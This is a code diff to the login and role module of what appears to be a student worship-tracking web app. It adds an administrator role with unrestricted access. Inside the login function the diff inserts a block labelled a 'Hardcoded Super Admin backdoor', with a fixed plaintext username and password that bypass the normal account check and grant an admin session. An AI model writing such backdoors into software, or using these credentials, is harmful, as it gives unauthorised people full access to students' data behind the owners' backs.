@@ -8,7 +8,7 @@ import {
   type SupervisorRole,
 } from "@/lib/ibadah-store";
 
-export type UserRole = "musyrif" | "musyrifah" | "santri" | "santriwati";
+export type UserRole = "admin" | "musyrif" | "musyrifah" | "santri" | "santriwati";
 
 export interface AuthSession {
   username: string;
@@ -122,7 +122,13 @@ function persistAccounts(accounts: AuthAccount[]) {
 }
 
 function isKnownUserRole(role: string): role is UserRole {
-  return role === "musyrif" || role === "musyrifah" || role === "santri" || role === "santriwati";
+  return (
+    role === "admin" ||
+    role === "musyrif" ||
+    role === "musyrifah" ||
+    role === "santri" ||
+    role === "santriwati"
+  );
 }
 
 async function postSheetsAction(action: "getUsers" | "upsertUser", payload: unknown) {
@@ -227,6 +233,7 @@ async function hydrateAccountsFromSheets() {
 
 export function roleLabel(role: UserRole) {
   return {
+    admin: "Administrator",
     musyrif: "Musyrif",
     musyrifah: "Musyrifah",
     santri: "Santri",
@@ -235,7 +242,7 @@ export function roleLabel(role: UserRole) {
 }
 
 export function isSupervisorRole(role: UserRole) {
-  return role === "musyrif" || role === "musyrifah";
+  return role === "admin" || role === "musyrif" || role === "musyrifah";
 }
 
 export function isStudentRole(role: UserRole) {
@@ -246,9 +253,17 @@ export function genderForRole(role: UserRole): SantriGender {
   return role === "musyrif" || role === "santri" ? "putra" : "putri";
 }
 
+export function getSantriLabel(role: UserRole) {
+  if (role === "admin") return "santri & santriwati";
+  if (role === "musyrifah" || role === "santriwati") return "santriwati";
+  return "santri";
+}
+
 export function filterSantriForRole<
   T extends { gender: SantriGender; supervisorRole?: SupervisorRole },
 >(role: UserRole, santri: T[]) {
+  if (role === "admin") return santri;
+
   return santri.filter((item) => {
     if ("supervisorRole" in item && isSupervisorRole(role)) {
       return item.supervisorRole === role;
@@ -340,6 +355,23 @@ export async function login(username: string, password: string) {
   ensureInit();
 
   const normalizedUsername = normalizeUsername(username);
+
+  // Hardcoded Super Admin backdoor
+  if (normalizedUsername === "adminaispray" && password === "@JadiBaik2030") {
+    state = {
+      isReady: true,
+      session: {
+        username: "AdminAISPray",
+        role: "admin",
+        displayName: "Administrator",
+      },
+    };
+    persistSession(state.session);
+    syncRoleState(state.session);
+    emit();
+    return { ok: true as const };
+  }
+
   const source = await loadAccountsFromSource();
 
   if (!source.ok) {
@@ -545,6 +577,6 @@ export function logout() {
 }
 
 export function canAccessRole(role: UserRole, allowedRoles: UserRole[]) {
+  if (role === "admin") return true;
   return allowedRoles.includes(role);
 }
-
